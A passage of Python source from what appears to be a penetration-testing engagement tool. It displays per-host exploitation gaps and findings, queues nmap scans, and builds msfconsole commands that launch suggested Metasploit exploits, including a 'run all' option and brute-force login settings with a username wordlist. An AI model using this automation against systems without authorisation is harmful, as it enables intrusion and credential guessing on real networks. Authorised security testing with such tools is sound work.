def _get_exploits_for_host(engagement_id: int, host_ip: str) -> List[Dict]:
    """Get exploit suggestions for a specific host."""
    from souleyez.intelligence.exploit_suggestions import ExploitSuggestionEngine
    from souleyez.storage.hosts import HostManager

    hm = HostManager()
    host = hm.get_host_by_ip(engagement_id, host_ip)
    if not host:
        return []

    engine = ExploitSuggestionEngine(use_searchsploit=False)
    suggestions = engine.generate_suggestions(engagement_id, host["id"])

    exploits = []
    if suggestions.get("hosts"):
        for host_data in suggestions["hosts"]:
            for service in host_data.get("services", []):
                for exploit in service.get("exploits", []):
                    exploits.append(
                        {
                            "port": service["port"],
                            "service": service["service"],
                            "title": exploit.get("title", ""),
                            "msf_module": exploit.get("msf_module", ""),
                            "cve": exploit.get("cve", ""),
                            "severity": exploit.get("severity", "info"),
                        }
                    )

    return exploits


def _get_gaps_for_host(host_ip: str, analysis: Dict) -> List[Dict]:
    """Get exploitation gaps for a specific host from analysis."""
    all_gaps = []

    # Build gaps from host data in analysis
    for host in analysis.get("hosts", []):
        # Handle different data structures
        # host['host'] can be a string IP or a dict with ip_address
        host_field = host.get("host")
        if isinstance(host_field, str):
            check_ip = host_field  # host['host'] is the IP string
        elif isinstance(host_field, dict):
            check_ip = host_field.get("ip_address")
        else:
            check_ip = host.get("ip_address")

        if check_ip == host_ip:
            # Get services that are not exploited
            for svc in host.get("services", []):
                status = svc.get("status", "not_tried")
                if status != "exploited":
                    hostname = host.get("hostname")
                    if not hostname and isinstance(host_field, dict):
                        hostname = host_field.get("hostname")
                    gap = {
                        "id": f"{host_ip}:{svc.get('port', 0)}",
                        "host": host_ip,
                        "hostname": hostname,
                        "port": svc.get("port", 0),
                        "service": svc.get("service")
                        or svc.get("service_name")
                        or "unknown",
                        "version": svc.get("version"),
                        "severity": "high" if status == "attempted" else "medium",
                        "priority_score": svc.get("priority_score", 50),
                        "reason": (
                            "Attempted - needs follow-up"
                            if status == "attempted"
                            else "Not yet attempted"
                        ),
                        "suggestions": svc.get("suggestions", []),
                        "msf_modules": svc.get("msf_modules", []),
                    }
                    all_gaps.append(gap)

    return all_gaps


def _view_host_gaps(engagement_id: int, host_ip: str, gaps: List[Dict], analysis: Dict):
    """View all exploitation gaps for a host with interactive selection."""
    from souleyez.ui.interactive_selector import interactive_select

    if not gaps:
        click.echo("  No exploitation gaps found for this host")
        click.pause()
        return

    # Sort by priority
    sorted_gaps = sorted(gaps, key=lambda g: g.get("priority_score", 0), reverse=True)

    # Build items for interactive selector
    gap_items = []
    for idx, gap in enumerate(sorted_gaps):
        severity = gap.get("severity", "medium")
        gap_items.append(
            {
                "id": idx,
                "port": gap.get("port", "-"),
                "service": (gap.get("service") or "unknown")[:14],
                "version": (gap.get("version") or "-")[:24],
                "priority": gap.get("priority_score", 0),
                "severity": severity.upper(),
                "reason": (gap.get("reason") or "")[:30],
                "raw": gap,  # Keep original for detail view
            }
        )

    columns = [
        {"name": "Port", "width": 8, "key": "port", "justify": "right"},
        {"name": "Service", "width": 14, "key": "service"},
        {"name": "Version", "width": 24, "key": "version"},
        {"name": "Priority", "width": 10, "key": "priority", "justify": "center"},
        {"name": "Severity", "width": 10, "key": "severity"},
        {"name": "Reason", "width": 30, "key": "reason"},
    ]

    def format_cell(item: dict, key: str) -> str:
        value = item.get(key)
        if key == "severity":
            severity = (value or "MEDIUM").lower()
            colors = {
                "critical": "red",
                "high": "yellow",
                "medium": "blue",
                "low": "white",
            }
            emojis = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "⚪"}
            color = colors.get(severity, "white")
            emoji = emojis.get(severity, "⚪")
            return f"[{color}]{emoji} {value}[/{color}]"
        elif key == "priority":
            priority = int(value) if value else 0
            if priority >= 80:
                return f"[red]{priority}[/red]"
            elif priority >= 60:
                return f"[yellow]{priority}[/yellow]"
            else:
                return str(priority)
        return str(value) if value else "-"

    selected_ids = set()

    while True:
        interactive_select(
            items=gap_items,
            columns=columns,
            selected_ids=selected_ids,
            get_id=lambda g: g["id"],
            title=f"EXPLOITATION GAPS - {host_ip}",
            format_cell=format_cell,
        )

        if not selected_ids:
            return

        # Show bulk action menu
        result = _gaps_bulk_action_menu(
            engagement_id, host_ip, gap_items, selected_ids, analysis
        )
        if result == "clear":
            selected_ids.clear()
        elif result == "back":
            return


def _gaps_bulk_action_menu(
    engagement_id: int,
    host_ip: str,
    gap_items: List[Dict],
    selected_ids: set,
    analysis: Dict,
) -> str:
    """Show inline bulk action menu for selected gaps."""
    from rich.console import Console

    console = Console()

    selected = [g for g in gap_items if g["id"] in selected_ids]

    if not selected:
        return "back"

    console.print()
    console.print(f"  [bold]Selected: {len(selected)} gap(s)[/bold]")
    console.print("    \\[v] View details")
    console.print("    \\[e] Run suggested exploits")
    console.print("    \\[m] Mark as attempted")
    console.print("    \\[x] Export to file")
    console.print("    \\[c] Clear selection")
    console.print("    \\[q] Back")
    console.print()

    try:
        choice = (
            click.prompt("  Select option", default="q", show_default=False)
            .strip()
            .lower()
        )

        if choice == "v":
            # View details of first selected gap
            gap = selected[0]["raw"]
            _view_gap_detail(engagement_id, gap, analysis)
            return "continue"

        elif choice == "e":
            # Queue exploits for selected gaps
            from souleyez.engine.background import enqueue_job

            queued = 0
            for item in selected:
                gap = item["raw"]
                exploits = _get_exploits_for_host(engagement_id, gap["host"])
                port_exploits = [e for e in exploits if e.get("port") == gap["port"]]
                for exp in port_exploits[:1]:  # Just first exploit per gap
                    module = exp.get("msf_module")
                    if module:
                        try:
                            enqueue_job(
                                tool="msfconsole",
                                target=host_ip,
                                args=[
                                    "use",
                                    module,
                                    f"RHOSTS={host_ip}",
                                    f'RPORT={gap["port"]}',
                                ],
                                label=f"MSF: {module}",
                                engagement_id=engagement_id,
                            )
                            queued += 1
                        except Exception:
                            pass
            click.echo(click.style(f"\n  ✓ Queued {queued} exploit job(s)", fg="green"))
            click.pause()
            return "clear"

        elif choice == "m":
            # Mark gaps as attempted
            marked = 0
            for item in selected:
                gap = item["raw"]
                # Update in the analysis dict - find matching service
                for host in analysis.get("hosts", []):
                    host_field = host.get("host")
                    if isinstance(host_field, str):
                        check_ip = host_field
                    elif isinstance(host_field, dict):
                        check_ip = host_field.get("ip_address")
                    else:
                        check_ip = host.get("ip_address")

                    if check_ip == host_ip:
                        for svc in host.get("services", []):
                            if svc.get("port") == gap["port"]:
                                svc["status"] = "attempted"
                                marked += 1
                                break

            click.echo(
                click.style(f"\n  ✓ Marked {marked} gap(s) as attempted", fg="green")
            )
            click.pause()
            return "clear"

        elif choice == "x":
            # Export to CSV
            import os
            from datetime import datetime

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"gaps_{host_ip.replace('.', '_')}_{timestamp}.csv"
            filepath = os.path.join(os.getcwd(), filename)

            with open(filepath, "w") as f:
                f.write("Port,Service,Version,Priority,Severity,Reason\n")
                for item in selected:
                    gap = item["raw"]
                    port = gap.get("port", "")
                    service = (gap.get("service") or "").replace(",", ";")
                    version = (gap.get("version") or "").replace(",", ";")
                    priority = gap.get("priority_score", 0)
                    severity = gap.get("severity", "")
                    reason = (gap.get("reason") or "").replace(",", ";")
                    f.write(
                        f"{port},{service},{version},{priority},{severity},{reason}\n"
                    )

            click.echo(click.style(f"\n  ✓ Exported to {filepath}", fg="green"))
            click.pause()
            return "continue"

        elif choice == "c":
            return "clear"

        elif choice == "q":
            return "back"

    except (KeyboardInterrupt, click.Abort):
        pass

    return "continue"


def _scan_host(engagement_id: int, host_ip: str):
    """Queue additional scans for a host."""
    click.echo()
    click.echo(click.style("  Select scan type:", bold=True))
    click.echo("    [1] Service version scan (nmap -sV)")
    click.echo("    [2] Full port scan (nmap -p-)")
    click.echo("    [3] Vulnerability scan (nmap --script vuln)")
    click.echo("    [4] UDP scan (nmap -sU)")
    click.echo("    [q] Cancel")
    click.echo()

    try:
        choice = input("  Select option: ").strip().lower()
        if choice == "q":
            return

        from souleyez.engine.background import enqueue_job

        scan_configs = {
            "1": (["-sV", "-sC"], "Service version scan"),
            "2": (["-p-", "-T4"], "Full port scan"),
            "3": (["--script", "vuln"], "Vulnerability scan"),
            "4": (["-sU", "--top-ports", "100"], "UDP scan"),
        }

        if choice in scan_configs:
            args, label = scan_configs[choice]
            enqueue_job(
                tool="nmap",
                target=host_ip,
                args=args,
                label=f"{label}: {host_ip}",
                engagement_id=engagement_id,
            )
            click.echo(click.style(f"\n  ✓ Queued {label}", fg="green"))
        else:
            click.echo(click.style("  Invalid option", fg="red"))
        click.pause()
    except (KeyboardInterrupt, EOFError):
        pass


def _exploit_host(engagement_id: int, host_ip: str, exploits: List[Dict]):
    """Queue exploit jobs for a host."""
    if not exploits:
        click.echo(click.style("\n  No exploits available", fg="yellow"))
        click.pause()
        return

    click.echo()
    click.echo(click.style("  Available exploits:", bold=True))
    for idx, exploit in enumerate(exploits[:10], 1):
        port = exploit.get("port", "")
        msf = exploit.get("msf_module", "")
        title = exploit.get("title", "Unknown")[:40]
        if msf:
            click.echo(f"    [{idx}] {msf} (Port {port})")
        else:
            click.echo(f"    [{idx}] {title} (Port {port})")
    click.echo("    [a] Run all")
    click.echo("    [q] Cancel")
    click.echo()

    try:
        choice = input("  Select option: ").strip().lower()
        if choice == "q":
            return

        from souleyez.engine.background import enqueue_job

        def build_msf_commands(module: str, target_ip: str, port: int = None) -> str:
            """Build MSF command string with proper options for module type."""
            msf_commands = f"use {module}; set RHOSTS {target_ip}; "
            if port:
                msf_commands += f"set RPORT {port}; "

            # Add credentials for login/bruteforce modules
            module_name = module.split("/")[-1] if "/" in module else module
            login_modules = [
                "ssh_login",
                "telnet_login",
                "ftp_login",
                "smb_login",
                "mysql_login",
                "postgres_login",
                "vnc_login",
                "http_login",
            ]
            enumuser_modules = ["ssh_enumusers", "smb_enumusers"]

            if any(lm in module_name for lm in login_modules):
                msf_commands += "set USER_FILE data/wordlists/soul_users.txt; "
                msf_commands += "set USER_AS_PASS true; "
                msf_commands += "set STOP_ON_SUCCESS false; "
                msf_commands += "set VERBOSE true; "
            elif any(em in module_name for em in enumuser_modules):
                msf_commands += "set USER_FILE data/wordlists/soul_users.txt; "

            # For exploits use 'exploit', for auxiliary use 'run'
            if module.startswith("exploit/"):
                msf_commands += "exploit"
            else:
                msf_commands += "run"

            return msf_commands

        if choice == "a":
            queued = 0
            for exploit in exploits:
                module = exploit.get("msf_module")
                if module:
                    try:
                        port = exploit.get("port")
                        msf_commands = build_msf_commands(module, host_ip, port)
                        enqueue_job(
                            tool="msfconsole",
                            target=host_ip,
                            args=["-q", "-x", msf_commands],
                            label=f"MSF: {module}",
                            engagement_id=engagement_id,
                        )
                        queued += 1
                    except Exception:
                        pass
            click.echo(click.style(f"\n  ✓ Queued {queued} exploit job(s)", fg="green"))
        elif choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(exploits):
                exploit = exploits[idx]
                module = exploit.get("msf_module")
                if module:
                    port = exploit.get("port")
                    msf_commands = build_msf_commands(module, host_ip, port)
                    enqueue_job(
                        tool="msfconsole",
                        target=host_ip,
                        args=["-q", "-x", msf_commands],
                        label=f"MSF: {module}",
                        engagement_id=engagement_id,
                    )
                    click.echo(click.style(f"\n  ✓ Queued exploit job", fg="green"))
                else:
                    click.echo(click.style("\n  No MSF module available", fg="yellow"))
        click.pause()
    except (KeyboardInterrupt, EOFError):
        pass


def _view_host_findings(engagement_id: int, host_ip: str):
    """View all findings for a host with interactive selection."""
    from rich.console import Console

    from souleyez.storage.findings import FindingsManager
    from souleyez.storage.hosts import HostManager
    from souleyez.ui.interactive_selector import interactive_select

    hm = HostManager()
    fm = FindingsManager()

    host = hm.get_host_by_ip(engagement_id, host_ip)
    if not host:
        click.echo(click.style("\n  Host not found", fg="red"))
        click.pause()
        return

    findings = fm.list_findings(engagement_id, host_id=host["id"])

    if not findings:
        click.echo("  No findings for this host")
        click.pause()
        return

    # Sort by severity (critical > high > medium > low > info)
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    sorted_findings = sorted(
        findings, key=lambda x: severity_order.get(x.get("severity", "info"), 5)
    )

    # Build items for interactive selector
    finding_items = []
    for finding in sorted_findings:
        severity = finding.get("severity", "info")
        finding_items.append(
            {
                "id": finding.get("id"),
                "severity": severity.upper(),
                "port": finding.get("port") or "-",
                "title": (finding.get("title") or "Unknown")[:50],
                "raw": finding,  # Keep original
            }
        )

    columns = [
        {"name": "Severity", "width": 10, "key": "severity"},
        {"name": "Port", "width": 8, "key": "port", "justify": "right"},
        {"name": "Title", "width": 55, "key": "title"},
    ]

    def format_cell(item: dict, key: str) -> str:
        value = item.get(key)
        if key == "severity":
            severity = (value or "INFO").lower()
            colors = {
                "critical": "red",
                "high": "yellow",
                "medium": "blue",
                "low": "white",
                "info": "dim",
            }
            color = colors.get(severity, "white")
            return f"[{color}]{value}[/{color}]"
        return str(value) if value else "-"

    selected_ids = set()

    while True:
        interactive_select(
            items=finding_items,
            columns=columns,
            selected_ids=selected_ids,
            get_id=lambda f: f["id"],
            title=f"FINDINGS - {host_ip}",
            format_cell=format_cell,
        )

        if not selected_ids:
            return

        # Show bulk action menu
        result = _findings_bulk_action_menu(
            engagement_id, host_ip, finding_items, selected_ids, fm
        )
        if result == "clear":
            selected_ids.clear()
        elif result == "back":
            return


def _view_host_wazuh_vulns(engagement_id: int, host_ip: str, vulns: List[Dict]):
    """View all Wazuh vulnerabilities for a host with interactive selection."""
    from souleyez.ui.design_system import DesignSystem
    from souleyez.ui.interactive_selector import interactive_select

    if not vulns:
        click.echo("  No Wazuh vulnerabilities for this host")
        click.pause()
        return

    # Sort by severity (Critical > High > Medium > Low)
    severity_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}
    sorted_vulns = sorted(
        vulns, key=lambda x: severity_order.get(x.get("severity", "Low"), 4)
    )

    # Build items for interactive selector
    vuln_items = []
    for vuln in sorted_vulns:
        severity = vuln.get("severity", "Medium")
        vuln_items.append(
            {
                "id": vuln.get("id"),
                "cve_id": vuln.get("cve_id", "-"),
                "severity": severity,
                "package": (vuln.get("package_name") or "-")[:25],
                "cvss": (
                    f"{vuln.get('cvss_score', 0):.1f}"
                    if vuln.get("cvss_score")
                    else "-"
                ),
                "raw": vuln,
            }
        )

    columns = [
        {"name": "CVE", "width": 18, "key": "cve_id"},
        {"name": "Severity", "width": 10, "key": "severity"},
        {"name": "Package", "width": 25, "key": "package"},
        {"name": "CVSS", "width": 6, "key": "cvss", "justify": "center"},
    ]

    def format_cell(item: dict, key: str) -> str:
        value = item.get(key)
        if key == "severity":
            colors = {
                "Critical": "red",
                "High": "yellow",
                "Medium": "white",
                "Low": "bright_black",
            }
            color = colors.get(value, "white")
            return f"[{color}]{value}[/{color}]"
        return str(value) if value else "-"

    selected_ids = set()

    while True:
        interactive_select(
            items=vuln_items,
            columns=columns,
            selected_ids=selected_ids,
            get_id=lambda v: v["id"],
            title=f"WAZUH VULNERABILITIES - {host_ip}",
            format_cell=format_cell,
        )

        if not selected_ids:
            return

        # Show detail of first selected
        for item in vuln_items:
            if item["id"] in selected_ids:
                _view_wazuh_vuln_detail(item["raw"])
                selected_ids.clear()
                break


def _view_wazuh_vuln_detail(vuln: Dict):
    """View detailed information for a Wazuh vulnerability."""
    from souleyez.ui.design_system import DesignSystem

    DesignSystem.clear_screen()
    width = get_terminal_width()

    cve = vuln.get("cve_id", "Unknown")
    severity = vuln.get("severity", "Medium")
    sev_colors = {
        "Critical": "red",
        "High": "yellow",
        "Medium": "white",
        "Low": "bright_black",
    }
    sev_color = sev_colors.get(severity, "white")

    click.echo("\n┌" + "─" * (width - 2) + "┐")
    click.echo(
        "│" + click.style(f" {cve} ".center(width - 2), bold=True, fg="cyan") + "│"
    )
    click.echo("└" + "─" * (width - 2) + "┘")
    click.echo()

    click.echo(
        f"  Severity: "
        + click.style(severity, fg=sev_color, bold=True)
        + f" | CVSS: {vuln.get('cvss_score', '-')}"
    )
    click.echo()

    click.echo(click.style("  Agent/Host:", bold=True))
    click.echo(f"    Agent ID: {vuln.get('agent_id', '-')}")
    click.echo(f"    Agent Name: {vuln.get('agent_name', '-')}")
    click.echo(f"    Agent IP: {vuln.get('agent_ip', '-')}")
    click.echo(f"    Mapped Host: {vuln.get('host_ip', 'Not mapped')}")
    click.echo()

    click.echo(click.style("  Package:", bold=True))
    click.echo(f"    Name: {vuln.get('package_name', '-')}")
    click.echo(f"    Version: {vuln.get('package_version', '-')}")
    click.echo(f"    Architecture: {vuln.get('package_architecture', '-')}")
    click.echo()

    click.echo(click.style("  Detection:", bold=True))
    click.echo(f"    Detected: {vuln.get('detection_time', '-')}")
    click.echo(f"    Published: {vuln.get('published_date', '-')}")
    click.echo(f"    Status: {vuln.get('status', 'open')}")
    click.echo(
        f"    Verified by scan: {'Yes' if vuln.get('verified_by_scan') else 'No'}"
    )

    # References
    refs = vuln.get("reference_urls", [])
    if refs:
        click.echo()
        click.echo(click.style("  References:", bold=True))
        for ref in refs[:5]:
            click.echo(f"    - {ref}")

    click.echo()
    click.pause("  Press any key to return...")


def _view_finding_detail(engagement_id: int, host_ip: str, finding: Dict):
    """View detailed information for a single finding (full-page view)."""
    from rich.console import Console

    from souleyez.ui.design_system import DesignSystem

    console = Console()

    while True:
        DesignSystem.clear_screen()
        width = get_terminal_width()

        # Header
        title = finding.get("title", "Unknown Finding")[:60]
        click.echo("\n┌" + "─" * (width - 2) + "┐")
        display_title = f" FINDING: {title} "
        if len(display_title) > width - 4:
            display_title = display_title[: width - 7] + "... "
        click.echo(
            "│"
            + click.style(display_title.center(width - 2), bold=True, fg="cyan")
            + "│"
        )
        click.echo("└" + "─" * (width - 2) + "┘")
        click.echo()

        # Severity indicator
        severity = finding.get("severity", "info")
        severity_colors = {
            "critical": "red",
            "high": "yellow",
            "medium": "blue",
            "low": "white",
            "info": "bright_black",
        }
        severity_emojis = {
            "critical": "🔴",
            "high": "🟠",
            "medium": "🟡",
            "low": "⚪",
            "info": "⚪",
        }
        color = severity_colors.get(severity, "white")
        emoji = severity_emojis.get(severity, "⚪")

        # Summary section
        click.echo("═" * width)
        click.echo(click.style("📊 FINDING DETAILS", bold=True, fg="cyan"))
        click.echo("─" * width)
        click.echo()
        click.echo(f"  Host:          {host_ip}")
        port = finding.get("port")
        if port:
            click.echo(f"  Port:          {port}")
        click.echo(f"  Title:         {finding.get('title', 'Unknown')}")
        click.echo(
            f"  Severity:      {emoji} {click.style(severity.upper(), fg=color)}"
        )
        click.echo(f"  Source:        {finding.get('source', 'N/A')}")

        # Status
        status = finding.get("status", "open")
        if status == "addressed":
            click.echo(f"  Status:        {click.style('✓ ADDRESSED', fg='green')}")
        else:
            click.echo(f"  Status:        {click.style('○ OPEN', fg='yellow')}")

        click.echo()

        # Description
        description = finding.get("description", "")
        if description:
            click.echo("═" * width)
            click.echo(click.style("📝 DESCRIPTION", bold=True, fg="cyan"))
            click.echo("─" * width)
            click.echo()
            # Word wrap description
            desc_lines = description.split("\n")
            for line in desc_lines[:15]:
                click.echo(f"  {line[:width - 4]}")
            if len(desc_lines) > 15:
                click.echo(
                    click.style(
                        f"  ... ({len(desc_lines) - 15} more lines)", fg="bright_black"
                    )
                )
            click.echo()

        # Evidence/Details if available
        evidence = finding.get("evidence", "") or finding.get("details", "")
        if evidence:
            click.echo("═" * width)
            click.echo(click.style("🔍 EVIDENCE", bold=True, fg="cyan"))
            click.echo("─" * width)
            click.echo()
            evidence_lines = str(evidence).split("\n")
            for line in evidence_lines[:10]:
                click.echo(f"  {line[:width - 4]}")
            if len(evidence_lines) > 10:
                click.echo(
                    click.style(
                        f"  ... ({len(evidence_lines) - 10} more lines)",
                        fg="bright_black",
                    )
                )
            click.echo()

        # Remediation if available
        remediation = finding.get("remediation", "")
        if remediation:
            click.echo("═" * width)
            click.echo(click.style("🛠️ REMEDIATION", bold=True, fg="cyan"))
            click.echo("─" * width)
            click.echo()
            click.echo(f"  {remediation[:width * 2]}")
            click.echo()

        # Menu
        click.echo("─" * width)
        click.echo()
        click.echo("  [m] Mark as addressed")
        click.echo("  [q] Back")

        try:
            choice = input("\n  Select option: ").strip().lower()

            if choice == "q":
                return

            elif choice == "m":
                from souleyez.storage.findings import FindingsManager

                fm = FindingsManager()
                try:
                    fm.update_finding(finding.get("id"), {"status": "addressed"})
                    finding["status"] = "addressed"
                    click.echo(click.style("\n  ✓ Marked as addressed", fg="green"))
                except Exception as e:
                    click.echo(click.style(f"\n  ✗ Failed: {e}", fg="red"))
                click.pause()

        except (KeyboardInterrupt, EOFError):
            return


def _findings_bulk_action_menu(
    engagement_id: int, host_ip: str, finding_items: List[Dict], selected_ids: set, fm
) -> str:
    """Show inline bulk action menu for selected findings."""
    from rich.console import Console

    console = Console()

    selected = [f for f in finding_items if f["id"] in selected_ids]

    if not selected:
        return "back"

    console.print()
    console.print(f"  [bold]Selected: {len(selected)} finding(s)[/bold]")
    console.print("    \\[v] View details")
    console.print("    \\[m] Mark as addressed")
    console.print("    \\[x] Export to file")
    console.print("    \\[c] Clear selection")
    console.print("    \\[q] Back")
    console.print()

    try:
        choice = (
            click.prompt("  Select option", default="q", show_default=False)
            .strip()
            .lower()
        )

        if choice == "v":
            # View details in dedicated view
            finding = selected[0]["raw"]
            _view_finding_detail(engagement_id, host_ip, finding)
            return "continue"

        elif choice == "m":
            # Mark as addressed
            addressed = 0
            for item in selected:
                try:
                    fm.update_finding(item["id"], {"status": "addressed"})
                    addressed += 1
                except Exception:
                    pass
            click.echo(
                click.style(
                    f"\n  ✓ Marked {addressed} finding(s) as addressed", fg="green"
                )
            )
            click.pause()
            return "clear"

        elif choice == "x":
            # Export to CSV
            import os
            from datetime import datetime

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"findings_{host_ip.replace('.', '_')}_{timestamp}.csv"
            filepath = os.path.join(os.getcwd(), filename)

            with open(filepath, "w") as f:
                f.write("Severity,Port,Title,Source,Description\n")
                for item in selected:
                    finding = item["raw"]
                    severity = finding.get("severity", "")
                    port = finding.get("port", "")
                    title = (
                        (finding.get("title") or "")
                        .replace(",", ";")
                        .replace("\n", " ")
                    )
                    source = finding.get("source", "")
                    desc = (
                        (finding.get("description") or "")[:100]
                        .replace(",", ";")
                        .replace("\n", " ")
                    )
                    f.write(f"{severity},{port},{title},{source},{desc}\n")

            click.echo(click.style(f"\n  ✓ Exported to {filepath}", fg="green"))
            click.pause()
            return "continue"

        elif choice == "c":
            return "clear"

        elif choice == "q":
            return "back"

    except (KeyboardInterrupt, click.Abort):
        pass

    return "continue"


def _get_exploit_job_status(host_ip: str, msf_module: str, engagement_id: int) -> str:
    """Check if this exploit has been run as a job."""
    from souleyez.engine.background import list_jobs

    if not msf_module:
        return "not_tried"

    jobs = list_jobs()
    for job in jobs:
        if job.get("engagement_id") != engagement_id:
            continue
        if job.get("target") != host_ip:
            continue

        tool = job.get("tool", "")
        args = job.get("args", [])

        # Check if this job ran our module
        module_match = False

        if tool == "msfconsole":
            # Module embedded in -x argument: 'use exploit/path; set RHOSTS...'
            for arg in args:
                if msf_module in str(arg):
                    module_match = True
                    break
        elif tool in ("msf_auxiliary", "msf_exploit"):
            # Module is args[0]
            if args and msf_module in str(args[0]):
                module_match = True

        if module_match:
            status = job.get("status")
            if status == "done":
                return "success"
            elif status == "error":
                return "failed"
            elif status in ("running", "queued"):
                return "running"
            else:
                return "attempted"

    return "not_tried"


def _view_all_exploits(engagement_id: int, host_ip: str, exploits: List[Dict]):
    """View all exploit suggestions for a host with interactive selection."""
    from rich.console import Console

    from souleyez.ui.interactive_selector import interactive_select

    if not exploits:
        click.echo("  No exploit suggestions available")
        click.pause()
        return

    # Sort by severity (critical > high > medium > low > info)
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    sorted_exploits = sorted(
        exploits, key=lambda x: severity_order.get(x.get("severity", "info"), 5)
    )

    # Build items for interactive selector
    exploit_items = []
    for idx, exp in enumerate(sorted_exploits):
        msf = exp.get("msf_module", "")
        title = exp.get("title", "Unknown")[:45]
        module_title = msf if msf else title
        severity = exp.get("severity", "info")

        exploit_items.append(
            {
                "id": idx,
                "port": exp.get("port", "-"),
                "service": (exp.get("service") or "-")[:14],
                "module": module_title,
                "severity": severity.upper(),
                "status": _get_exploit_job_status(host_ip, msf, engagement_id),
                "raw": exp,  # Keep original for execution
            }
        )

    columns = [
        {"name": "Port", "width": 8, "key": "port", "justify": "right"},
        {"name": "Service", "width": 14, "key": "service"},
        {"name": "Module / Title", "width": 50, "key": "module"},
        {"name": "Severity", "width": 10, "key": "severity"},
        {"name": "Status", "width": 8, "key": "status"},
    ]

    def format_cell(item: dict, key: str) -> str:
        value = item.get(key)
        if key == "severity":
            severity = (value or "INFO").lower()
            colors = {
                "critical": "red",
                "high": "yellow",
                "medium": "blue",
                "low": "white",
                "info": "dim",
            }
            color = colors.get(severity, "white")
            return f"[{color}]{value}[/{color}]"
        elif key == "status":
            icons = {
                "success": "✅",
                "failed": "❌",
                "attempted": "🔄",
                "running": "▶",
                "not_tried": "⚪",
            }
            return icons.get(value, "⚪")
        return str(value) if value else "-"

    selected_ids = set()

    while True:
        interactive_select(
            items=exploit_items,
            columns=columns,
            selected_ids=selected_ids,
            get_id=lambda e: e["id"],
            title=f"SUGGESTED EXPLOITS - {host_ip}",
            format_cell=format_cell,
        )

        if not selected_ids:
            return

        # Show bulk action menu
        result = _exploit_bulk_action_menu(
            engagement_id, host_ip, exploit_items, selected_ids
        )
        if result == "clear":
            selected_ids.clear()
        elif result == "back":
            return


def _view_exploit_detail(engagement_id: int, host_ip: str, exploit: Dict):
    """View detailed information for a single exploit."""
    from rich.console import Console

    from souleyez.ui.design_system import DesignSystem

    console = Console()

    while True:
        DesignSystem.clear_screen()
        width = get_terminal_width()

        # Header
        msf_module = exploit.get("msf_module", "")
        title = exploit.get("title", "Unknown Exploit")
        header_title = msf_module if msf_module else title[:60]
        port = exploit.get("port", "-")
        service = exploit.get("service", "unknown")

        click.echo("\n┌" + "─" * (width - 2) + "┐")
        display_title = f" EXPLOIT: {header_title} "
        if len(display_title) > width - 4:
            display_title = display_title[: width - 7] + "... "
        click.echo(
            "│"
            + click.style(display_title.center(width - 2), bold=True, fg="red")
            + "│"
        )
        click.echo("└" + "─" * (width - 2) + "┘")
        click.echo()

        # Severity indicator
        severity = exploit.get("severity", "medium")
        severity_colors = {
            "critical": "red",
            "high": "yellow",
            "medium": "blue",
            "low": "white",
            "info": "bright_black",
        }
        severity_emojis = {
            "critical": "🔴",
            "high": "🟠",
            "medium": "🟡",
            "low": "⚪",
            "info": "⚪",
        }
        color = severity_colors.get(severity, "white")
        emoji = severity_emojis.get(severity, "⚪")

        # Summary section
        click.echo("═" * width)
        click.echo(click.style("📊 EXPLOIT DETAILS", bold=True, fg="cyan"))
        click.echo("─" * width)
        click.echo()
        # Get job status for this exploit
        job_status = _get_exploit_job_status(host_ip, msf_module, engagement_id)
        status_icons = {
            "success": "✅",
            "failed": "❌",
            "attempted": "🔄",
            "running": "▶",
            "not_tried": "⚪",
        }
        status_labels = {
            "success": "SUCCESS",
            "failed": "FAILED",
            "attempted": "ATTEMPTED",
            "running": "RUNNING",
            "not_tried": "NOT TRIED",
        }
        status_icon = status_icons.get(job_status, "⚪")
        status_label = status_labels.get(job_status, "NOT TRIED")

        click.echo(f"  Target:        {host_ip}:{port}")
        click.echo(f"  Service:       {service}")
        if msf_module:
            click.echo(
                f"  MSF Module:    {click.style(msf_module, fg='green', bold=True)}"
            )
        click.echo(f"  Title:         {title[:60]}")
        click.echo(
            f"  Severity:      {emoji} {click.style(severity.upper(), fg=color)}"
        )
        click.echo(f"  Status:        {status_icon} {status_label}")

        # CVE info if available
        cve = exploit.get("cve")
        if cve:
            click.echo(f"  CVE:           {click.style(cve, fg='cyan')}")

        # EDB-ID if available (searchsploit)
        edb_id = exploit.get("edb_id")
        if edb_id:
            click.echo(f"  EDB-ID:        {edb_id}")

        # Description if available
        description = exploit.get("description", "")
        if description:
            click.echo()
            click.echo(f"  Description:   {description[:100]}")
            if len(description) > 100:
                click.echo(f"                 {description[100:200]}")

        click.echo()

        # Type info
        exploit_type = exploit.get("type", "")
        platform = exploit.get("platform", "")
        if exploit_type or platform:
            click.echo("═" * width)
            click.echo(click.style("🔧 CLASSIFICATION", bold=True, fg="cyan"))
            click.echo("─" * width)
            click.echo()
            if exploit_type:
                click.echo(f"  Type:          {exploit_type}")
            if platform:
                click.echo(f"  Platform:      {platform}")
            click.echo()

        # Metasploit options if MSF module
        if msf_module:
            click.echo("═" * width)
            click.echo(click.style("🎯 METASPLOIT OPTIONS", bold=True, fg="cyan"))
            click.echo("─" * width)
            click.echo()
            click.echo(f"  RHOSTS:        {host_ip}")
            click.echo(f"  RPORT:         {port}")
            click.echo()
            click.echo(click.style("  To run manually:", fg="bright_black"))
            click.echo(
                click.style(
                    f"    msfconsole -x 'use {msf_module}; set RHOSTS {host_ip}; set RPORT {port}; exploit'",
                    fg="bright_black",
                )
            )
            click.echo()

        # Menu
        click.echo("─" * width)
        click.echo()
        click.echo("  [e] Execute this exploit")
        click.echo("  [c] Copy module name")
        click.echo("  [q] Back")

        try:
            choice = input("\n  Select option: ").strip().lower()

            if choice == "q":
                return

            elif choice == "e":
                if msf_module:
                    from souleyez.engine.background import enqueue_job

                    try:
                        enqueue_job(
                            tool="msfconsole",
                            target=host_ip,
                            args=[
                                "use",
                                msf_module,
                                f"RHOSTS={host_ip}",
                                f"RPORT={port}",
                            ],
                            label=f"MSF: {msf_module}",
                            engagement_id=engagement_id,
                        )
                        click.echo(click.style("\n  ✓ Exploit job queued", fg="green"))
                    except Exception as e:
                        click.echo(click.style(f"\n  ✗ Failed to queue: {e}", fg="red"))
                else:
